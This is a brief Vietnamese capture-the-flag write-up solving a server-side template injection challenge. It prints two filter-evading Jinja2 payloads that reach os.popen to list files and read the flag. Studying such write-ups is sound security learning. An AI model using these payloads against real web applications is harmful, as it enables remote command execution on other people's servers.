Sau khi thử hết mọi phương pháp thì ta xác định được đó là SSTI

Dùng payload tấn công xem web bảo mật không và thấy nó có bảo mật

![image](https://github.com/user-attachments/assets/c4559dd2-5fa3-4974-97ed-c9fc949c64d1)

![image](https://github.com/user-attachments/assets/0c7a0918-ecab-48d4-9c51-e559c0eacc79)

Thử payload
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}

![image](https://github.com/user-attachments/assets/eeb501ec-53cc-4501-a915-ad33c3f96e9e)

Dùng payload để đọc flag:
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

![image](https://github.com/user-attachments/assets/d9428f1b-80f6-41d4-9b2b-e3430147ca40)
